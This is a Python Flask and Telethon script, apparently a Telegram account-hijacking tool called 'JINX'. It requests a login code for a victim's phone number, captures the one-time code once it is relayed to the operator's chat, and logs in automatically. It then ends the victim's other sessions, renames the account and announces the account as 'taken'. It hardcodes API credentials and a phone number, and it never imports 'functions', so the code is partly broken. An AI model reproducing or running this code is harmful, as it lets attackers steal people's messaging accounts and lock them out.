from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon import events
import asyncio
import nest_asyncio
import os
import json
import threading

nest_asyncio.apply()  # FIX THREAD ERROR

app = Flask(__name__)

# DATA LO
API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
PHONE = '+6285697919996'
SESSION_STRING = os.environ.get('SESSION_STRING')

# Database
DB_FILE = '/tmp/jinx_db.json'

def save_target(phone, hash_code):
    data = {'phone': phone, 'hash': hash_code, 'otp': None}
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

def get_target():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return None

# Client utama
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# TANGKAP OTP
@client.on(events.NewMessage(chats=PHONE))
async def otp_handler(event):
    if event.message.message and event.message.message.isdigit() and len(event.message.message) == 5:
        otp = event.message.message
        print(f"[JINX] OTP MASUK: {otp}")
        data = get_target()
        if data and not data.get('otp'):
            data['otp'] = otp
            with open(DB_FILE, 'w') as f:
                json.dump(data, f)
            await auto_login(data['phone'], data['hash'], otp)

# AUTO LOGIN
async def auto_login(phone, phone_code_hash, otp):
    try:
        target_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await target_client.connect()
        await target_client.sign_in(phone, code=otp, phone_code_hash=phone_code_hash)
        print(f"[JINX] AUTO LOGIN SUKSES: {phone}")
        
        # HAPUS SESSION LAIN
        auths = await target_client(functions.account.GetAuthorizationsRequest())
        for auth in auths.authorizations:
            if not auth.current:
                await target_client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
        
        await target_client(functions.account.UpdateProfileRequest(first_name="Akun Cadangan"))
        print(f"[JINX] AKUN {phone} SUDAH DIAMBIL!")
    except Exception as e:
        print(f"[JINX] GAGAL LOGIN: {e}")

# BACKGROUND CLIENT
def run_client():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(client.start())
    loop.run_forever()

threading.Thread(target=run_client, daemon=True).start()

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'no phone'})
    
    async def run():
        try:
            res = await client.send_code_request(phone)
            save_target(phone, res.phone_code_hash)
            return {'success': True, 'hash': res.phone_code_hash}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    loop = asyncio.get_event_loop()
    return jsonify(loop.run_until_complete(run()))

@app.route('/')
def home():
    return "JINX FULL AUTO — OTP MASUK → AUTO LOGIN! 😈"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
